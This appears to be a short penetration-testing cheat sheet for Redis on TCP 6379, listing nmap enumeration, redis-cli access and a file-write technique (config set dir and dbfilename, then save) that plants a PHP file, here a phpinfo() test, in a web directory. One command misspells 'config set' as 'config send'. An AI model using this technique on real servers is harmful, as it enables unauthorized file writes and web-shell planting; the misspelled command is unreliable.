## TCP 6379 Redis


### Enumeration
```
nmap --script redis-info -p 6379 <IP>
```

### Redis CLI

```
sudo apt install redis-tools
redis-cli -h <IP>
```

### Redis RCE

In some instances, it may be possible to remotely create a file on the system using the redis commands.  This exploit may be used to create files on the remote system 
```
# Creating a web accessible file
redis-cli -h <IP>
config set dir <remote directory>
config send dbfilename <newfile>.php
set test "<?php phpinfo(); ?>"
save

```



